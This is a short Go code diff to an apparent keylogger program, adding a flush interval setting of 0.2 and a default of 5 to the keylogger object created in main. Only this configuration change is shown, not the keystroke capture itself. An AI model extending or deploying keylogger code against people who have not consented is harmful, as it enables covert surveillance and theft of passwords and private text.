@@ -26,6 +26,7 @@ func main() {
 
 		k := createKeylogger()
 		k.setMode(mode, args[2])
+		k.setFlushInterval(.2)
 
 		k.start(time)
 	}
@@ -34,5 +35,5 @@ func main() {
 
 // create a keylogger with the default values
 func createKeylogger() keylogger {
-	return keylogger{}
+	return keylogger{flushInterval: 5}
 }
